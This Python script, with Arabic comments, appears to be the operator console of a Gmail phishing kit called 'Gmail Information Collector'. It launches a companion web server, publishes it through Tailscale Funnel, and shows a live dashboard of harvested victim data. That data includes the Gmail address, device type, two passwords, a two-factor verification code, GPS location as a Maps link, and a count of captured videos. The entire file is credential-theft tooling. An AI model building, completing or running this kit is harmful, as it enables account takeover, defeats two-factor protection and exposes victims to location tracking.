import subprocess
import time
import json
import os
import sys
import re
import requests # Added for get_public_ip in start_tailscale_funnel_and_get_url
from datetime import datetime
from colorama import init, Fore, Style, Back

# Global variable to hold the active Tailscale Funnel process
_active_funnel_process = None

# --- Tailscale Funnel Functions (Copied from zarga.py) ---
def check_tailscale_status():
    """Check if Tailscale is running and authenticated."""
    print(f"{Fore.CYAN}[⚙️] Checking Tailscale status...{Style.RESET_ALL}")
    try:
        result = subprocess.run(["tailscale", "status"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
        output = result.stdout
        if "Logged in as" in output and "Active" in output:
            print(f"{Fore.GREEN}[✓] Tailscale is running and authenticated.{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[✗] Tailscale is not logged in or active. Please log in first.{Style.RESET_ALL}")
            return False
    except FileNotFoundError:
        print(f"{Fore.RED}[✗] Tailscale command not found. Please install Tailscale: https://tailscale.com/download{Style.RESET_ALL}")
        return False
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}[✗] Error checking Tailscale status: {e.stderr.strip()}{Style.RESET_ALL}")
        return False
    except Exception as e:
        print(f"{Fore.RED}[✗] An unexpected error occurred while checking Tailscale status: {e}{Style.RESET_ALL}")
        return False

def start_tailscale_funnel_and_get_url(port, timeout=10):
    """Start Tailscale Funnel and extract the public URL."""
    global _active_funnel_process
    
    if not check_tailscale_status():
        print(f"{Fore.RED}[✗] Cannot start Tailscale Funnel: Tailscale is not active.{Style.RESET_ALL}")
        return None
    
    print(f"{Fore.CYAN}[🌐] Starting Tailscale Funnel on port {port}...{Style.RESET_ALL}")
    try:
        # Use subprocess.Popen to run funnel in the background
        command = ["tailscale", "funnel", str(port), "--bg"]
        print(f"{Fore.CYAN}[DEBUG] Funnel command: {' '.join(command)}{Style.RESET_ALL}")
        
        _active_funnel_process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1, # Line-buffered output
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
        )
        
        start_time = time.time()
        output_buffer = ""
        
        while time.time() - start_time < timeout:
            line = _active_funnel_process.stdout.readline()
            if line:
                output_buffer += line
                print(f"{Fore.BLUE}[FUNNEL_OUT] {line.strip()}{Style.RESET_ALL}") # Print funnel output
                match = re.search(r"(https?://[a-zA-Z0-9.-]+\.ts\.net/)", line)
                if match:
                    funnel_url = match.group(1)
                    print(f"{Fore.GREEN}[✓] Tailscale Funnel started. URL: {funnel_url}{Style.RESET_ALL}")
                    return funnel_url
            
            # Check for errors in stderr if process terminated early
            poll = _active_funnel_process.poll()
            if poll is not None:
                stderr_output = _active_funnel_process.stderr.read()
                if stderr_output:
                    print(f"{Fore.RED}[✗] Tailscale Funnel Error: {stderr_output.strip()}{Style.RESET_ALL}")
                print(f"{Fore.RED}[✗] Tailscale Funnel process exited unexpectedly with code {poll}.{Style.RESET_ALL}")
                return None
            
            time.sleep(0.5) # Wait a bit before checking again
            
        print(f"{Fore.RED}[✗] Tailscale Funnel did not return a URL within {timeout} seconds.{Style.RESET_ALL}")
        # Terminate if timed out
        if _active_funnel_process.poll() is None:
            _active_funnel_process.terminate()
            _active_funnel_process.wait(timeout=5)
            if _active_funnel_process.poll() is None:
                _active_funnel_process.kill()
        return None
    except FileNotFoundError:
        print(f"{Fore.RED}[✗] Tailscale command not found. Please install Tailscale: https://tailscale.com/download{Style.RESET_ALL}")
        return None
    except Exception as e:
        print(f"{Fore.RED}[✗] An error occurred while starting Tailscale Funnel: {e}{Style.RESET_ALL}")
        return None

def stop_tailscale_funnel():
    """Stop the active Tailscale Funnel process."""
    global _active_funnel_process
    if _active_funnel_process and _active_funnel_process.poll() is None:
        print(f"{Fore.YELLOW}[!] Stopping Tailscale Funnel...{Style.RESET_ALL}")
        try:
            # We don't have a direct way to stop --bg funnel using a command
            # so we terminate the process we started.
            _active_funnel_process.terminate()
            _active_funnel_process.wait(timeout=5) # Give it some time to terminate
            if _active_funnel_process.poll() is None: # If it's still running, kill it
                _active_funnel_process.kill()
            print(f"{Fore.GREEN}[✓] Tailscale Funnel stopped.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[✗] Error stopping Tailscale Funnel: {e}{Style.RESET_ALL}")
        _active_funnel_process = None
    elif _active_funnel_process:
        print(f"{Fore.YELLOW}[!] Tailscale Funnel process already stopped or not found.{Style.RESET_ALL}")

def get_port_from_minimal_app(app_path):
    """Extracts the port number from minimal_app.py."""
    try:
        with open(app_path, 'r', encoding='utf-8') as f:
            content = f.read()
            # Search for app.run(..., port=XXXXX, ...)
            match = re.search(r"app\.run\(.*port=(\d+).*", content)
            if match:
                port = int(match.group(1))
                print(f"{Fore.CYAN}[DEBUG] Detected minimal_app.py port: {port}{Style.RESET_ALL}")
                return port
            print(f"{Fore.YELLOW}[!] Could not find port in minimal_app.py. Defaulting to 50005.{Style.RESET_ALL}")
            return 50005 # Default if not found
    except FileNotFoundError:
        print(f"{Fore.RED}[✗] minimal_app.py not found at {app_path}{Style.RESET_ALL}")
        return None
    except Exception as e:
        print(f"{Fore.RED}[✗] Error reading minimal_app.py for port: {e}{Style.RESET_ALL}")
        return None

# تحديد المسار الأصلي للبرنامج
# التأكد من عمل المجلدات بشكل صحيح بغض النظر عن مكان التشغيل
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(SCRIPT_DIR)  # المجلد الرئيسي google-V3
SHARED_DATA_DIR = os.path.join(ROOT_DIR, 'collected_data')
SHARED_DATA_FILE = os.path.join(SHARED_DATA_DIR, 'shared_data.json')

# Initialize colorama
init()

def ensure_data_directory():
    """تأكد من وجود المجلدات اللازمة"""
    try:
        collected_dir = os.path.join(ROOT_DIR, 'collected_data')
        if not os.path.exists(collected_dir):
            os.makedirs(collected_dir)
            print(f"{Fore.GREEN}[✓] Created {collected_dir}{Style.RESET_ALL}")
        
        shared_file = os.path.join(collected_dir, 'shared_data.json')
        if not os.path.exists(shared_file):
            with open(shared_file, 'w', encoding='utf-8') as f:
                json.dump({
                    "credentials": {},
                    "location": {},
                    "last_update": datetime.now().isoformat()
                }, f, indent=2)
            print(f"{Fore.GREEN}[✓] Created {shared_file}{Style.RESET_ALL}")
        
        sessions_dir = os.path.join(ROOT_DIR, 'sessions')
        if not os.path.exists(sessions_dir):
            os.makedirs(sessions_dir)
            print(f"{Fore.GREEN}[✓] Created {sessions_dir}{Style.RESET_ALL}")
        
        return True
    except Exception as e:
        print(f"{Fore.RED}[✗] Error ensuring data directory: {str(e)}{Style.RESET_ALL}")
        return False

def clear_screen():
    """Clear the terminal screen."""
    # For Windows
    if os.name == 'nt':
        os.system('cls')
    # For Linux/Mac
    else:
        os.system('clear')

def print_google_logo():
    """Print the Google ASCII logo."""
    print(f"{Fore.RED}░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░ ")
    print(f"{Fore.RED}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        ")
    print(f"{Fore.RED}░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        ")
    print(f"{Fore.RED}░▒▓█▓▒▒▓███▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░▒▓█▓▒░      ░▒▓██████▓▒░   ")
    print(f"{Fore.RED}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        ")
    print(f"{Fore.RED}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        ")
    print(f"{Fore.RED} ░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓████████▓▒░ ")
    print(f"{Fore.RED}                                                                                ")
    print(f"{Fore.RED}                                                                                ")
    print(f"{Fore.CYAN}{'⎯' * 75}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}✨ {Style.BRIGHT}{Fore.YELLOW}Gmail Information Collector{Fore.MAGENTA} ✨{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'⎯' * 75}{Style.RESET_ALL}")
    print()

def clear_old_data():
    # حذف الملف القديم وإنشاء ملف فارغ جديد
    if os.path.exists(SHARED_DATA_FILE):
        try:
            initial_data = {"credentials": {}, "location": {}, "last_update": datetime.now().isoformat()}
            with open(SHARED_DATA_FILE, 'w', encoding='utf-8') as f:
                json.dump(initial_data, f, indent=2)
        except Exception as e:
            print(f"{Fore.RED}[!] Error clearing data: {str(e)}{Style.RESET_ALL}")

def read_shared_data():
    """Read shared data file for data exchange between processes"""
    try:
        shared_file = os.path.join(ROOT_DIR, 'collected_data/shared_data.json')
        if not os.path.exists(shared_file):
            print(f"{Fore.YELLOW}[!] Shared data file not found. Creating...{Style.RESET_ALL}")
            with open(shared_file, 'w', encoding='utf-8') as f:
                json.dump({
                    "credentials": {},
                    "location": {},
                    "last_update": datetime.now().isoformat()
                }, f, indent=2)
            return {}
            
        with open(shared_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
            
            # تشخيص بيانات الموقع
            if 'location' in data and isinstance(data['location'], dict):
                loc = data['location']
                if 'latitude' in loc and 'longitude' in loc:
                    lat = loc['latitude']
                    lng = loc['longitude']
                    if lat and lng:
                        print(f"{Fore.YELLOW}DEBUG - Location: lat={lat}, lng={lng}{Style.RESET_ALL}")
            
            return data
    except Exception as e:
        print(f"{Fore.RED}[!] Error reading data: {str(e)}{Style.RESET_ALL}")
        return None

def display_fixed_interface(data=None):
    """Display a fixed interface with updated information."""
    # Clear screen before displaying
    clear_screen()
    
    # Print Google logo
    print_google_logo()
    
    # Extract data if available
    email = ""
    device = ""
    password1 = ""
    password2 = ""
    verification_code = ""
    location = ""
    video_count = 0
    
    if data and 'credentials' in data:
        creds = data['credentials']
        email = creds.get('email', '')
        device = creds.get('device_type', '')
        
        # تعديل: استخدم المفتاح الصحيح password1 وليس password
        password1 = creds.get('password1', '')
        password2 = creds.get('password2', '')
        verification_code = creds.get('verification_code', '')
    
    # معالجة بيانات الموقع بطريقة صحيحة
    if data and 'location' in data:
        loc = data['location']
        if isinstance(loc, dict) and 'latitude' in loc and 'longitude' in loc:
            lat_raw = loc.get('latitude')
            lng_raw = loc.get('longitude')
            
            if lat_raw and lng_raw:
                # إنشاء رابط مباشر إلى خرائط Google بدون علامة @ في البداية
                location = f"https://www.google.com/maps?q={lat_raw},{lng_raw}"
    
    # استخراج عدد ملفات الفيديو
    if data and 'media' in data:
        media = data['media']
        video_count = media.get('video_count', 0)
    
    # Display fixed interface with proper padding
    max_line_length = 76  # أقصى طول للسطر داخل الإطار
    
    # إطار مزخرف للواجهة بالشكل المطلوب
    print(f"{Fore.BLUE}┏{'━' * 78}┓{Style.RESET_ALL}")
    print(f"{Fore.BLUE}┃{Style.BRIGHT}{Fore.WHITE}                           Google Collected Information                        {Style.RESET_ALL}{Fore.BLUE}┃{Style.RESET_ALL}")
    print(f"{Fore.BLUE}┣{'━' * 78}┫{Style.RESET_ALL}")
    
    # طباعة كل سطر مع ضمان عدم تجاوز طول الإطار
    def print_field(label, value, color, emoji=""):
        # حساب المساحة المتبقية بعد الملصق والقيمة
        label_colored = f"{color}{emoji} {label}:{Style.RESET_ALL} "
        label_visible_length = len(label) + len(emoji) + 3  # +3 للنقطتين والمسافة والإيموجي
        
        # معالجة خاصة للموقع (لضمان عرضه بشكل صحيح)
        displayed_value = value
        if label == "location" and value:
            # إذا كان الرابط يحتوي على google.com/maps، نعرض الرابط كاملاً بالصيغة المطلوبة
            if "google.com/maps" in value:
                # استخراج الإحداثيات من الرابط
                coords = value.split("?q=")[1].split("&")[0] if "?q=" in value else "Unknown"
                # عرض الرابط بالصيغة المطلوبة مع علامة @ في البداية
                displayed_value = f"https://www.google.com/maps?q={coords}"
                # تقدير الطول المرئي للقيمة
                visible_value_length = len(displayed_value)
            else:
                visible_value_length = len(value)
        # إضافة تنسيقات مختلفة للقيمة بناءً على النوع
        elif label == "passwd" and value:
            displayed_value = f"{Fore.GREEN}{Style.BRIGHT}{value}{Style.RESET_ALL}"
            visible_value_length = len(value)
        elif label == "passwd 2" and value:
            displayed_value = f"{Fore.RED}{Style.BRIGHT}{value}{Style.RESET_ALL}"
            visible_value_length = len(value)
        elif label == "2FA" and value:
            displayed_value = f"{Fore.YELLOW}{Style.BRIGHT}{value}{Style.RESET_ALL}"
            visible_value_length = len(value)
        elif label == "Gmail" and value:
            displayed_value = f"{Fore.LIGHTBLUE_EX}{Style.BRIGHT}{value}{Style.RESET_ALL}"
            visible_value_length = len(value)
        else:
            displayed_value = f"{Fore.WHITE}{value}{Style.RESET_ALL}"
            visible_value_length = len(value)
        
        # التأكد من أن القيمة لا تتجاوز العرض المتاح
        max_value_length = max_line_length - label_visible_length
        
        if visible_value_length > max_value_length:
            if label != "location":
                displayed_value = displayed_value[:max_value_length-3] + "..."
            visible_value_length = max_value_length
        
        # حساب تعبئة المسافات المتبقية
        padding = max_line_length - label_visible_length - visible_value_length
        padding = max(0, padding)  # لضمان عدم وجود عدد سالب
        
        print(f"{Fore.BLUE}┃       {label_colored}{displayed_value}{' ' * padding}{Fore.BLUE}┃{Style.RESET_ALL}")
    
    print_field("Gmail", email, Fore.RED, "📧")
    print_field("device", device, Fore.YELLOW, "📱")
    print_field("passwd", password1, Fore.GREEN, "🔑")
    print_field("passwd 2", password2, Fore.RED, "🔑")
    print_field("2FA", verification_code, Fore.YELLOW, "🔐")
    print_field("location", location, Fore.GREEN, "📍")
    print_field("videos", f"{video_count} files", Fore.MAGENTA, "🎥")
    
    # إضافة خط تزييني أسفل البيانات
    print(f"{Fore.BLUE}┣{'━' * 78}┫{Style.RESET_ALL}")
    
    # إضافة حالة الاتصال
    connection_status = f"{Fore.GREEN}● ONLINE{Style.RESET_ALL}"
    date_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    status_line = f"  {connection_status}  |  ⏱️ {date_now}  |  🔄 Waiting for data..."
    print(f"{Fore.BLUE}┃{status_line}{' ' * (78 - len(status_line))}{Fore.BLUE}┃{Style.RESET_ALL}")
    
    print(f"{Fore.BLUE}┗{'━' * 78}┛{Style.RESET_ALL}")
    
    # إضافة تنويه أسفل الواجهة
    print()
    print(f"{Fore.YELLOW}[ℹ️] {Style.BRIGHT}Press Ctrl+C to stop the collector{Style.RESET_ALL}")
    print()

def monitor_data():
    """Monitor for incoming data with a fixed interface that updates."""
    # التأكد من وجود المجلدات والملفات
    if not ensure_data_directory():
        print(f"{Fore.RED}[✗] Failed to ensure data directory exists. Exiting.{Style.RESET_ALL}")
        return
    
    # Display initial interface
    display_fixed_interface()
    
    # Clear old data before starting
    clear_old_data()
    
    # Start minimal_app.py in background without showing its output
    with open(os.devnull, 'w') as devnull:
        minimal_app_path = os.path.join(SCRIPT_DIR, 'minimal_app.py')
        print(f"{Fore.CYAN}[🚀] Starting minimal_app.py server...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[DEBUG] Python executable for minimal_app: {sys.executable}{Style.RESET_ALL}")
        minimal_process = subprocess.Popen(
            [sys.executable, minimal_app_path],
            stdout=sys.stdout,  # Direct stdout to console
            stderr=sys.stderr   # Direct stderr to console
        )
    
    start_time = datetime.now()
    counter = 0
    spinner_chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    
    print(f"{Fore.GREEN}[✓] Server started successfully!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[⏳] Waiting for connections...{Style.RESET_ALL}")
    
    try:
        # Get the port from minimal_app.py
        app_port = get_port_from_minimal_app(minimal_app_path)
        
        funnel_url = None
        if app_port:
            funnel_url = start_tailscale_funnel_and_get_url(app_port)
            if funnel_url:
                print(f"{Fore.GREEN}[✓] Funnel URL: {funnel_url}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[✗] Failed to start Tailscale Funnel or get URL.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Could not determine minimal_app.py port. Cannot start Funnel.{Style.RESET_ALL}")

        while True:
            data = read_shared_data()
            if data and 'last_update' in data:
                update_time = datetime.fromisoformat(data['last_update'])
                if update_time > start_time:
                    # Update the fixed interface with new data
                    display_fixed_interface(data)
            
            # Display spinner animation in terminal
            spinner = spinner_chars[counter % len(spinner_chars)]
            print(f"\r{Fore.CYAN}{spinner} Monitoring for new data...{Style.RESET_ALL}", end="", flush=True)
            counter += 1
            
            # Update every second
            time.sleep(0.1)
            
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Stopping collector...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[✓] Thank you for using Gmail Information Collector!{Style.RESET_ALL}")
        stop_tailscale_funnel() # Stop funnel first
        minimal_process.terminate()
        minimal_process.wait()
        sys.exit(0) # Exit cleanly after stopping processes
    except Exception as e:
        print(f"{Fore.RED}[!] An unexpected error occurred in monitor_data: {str(e)}{Style.RESET_ALL}")
        stop_tailscale_funnel() # Ensure funnel is stopped on other errors
        if minimal_process and minimal_process.poll() is None:
            minimal_process.terminate()
            minimal_process.wait()

def main():
    try:
        monitor_data()
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")

if __name__ == "__main__":
    main() 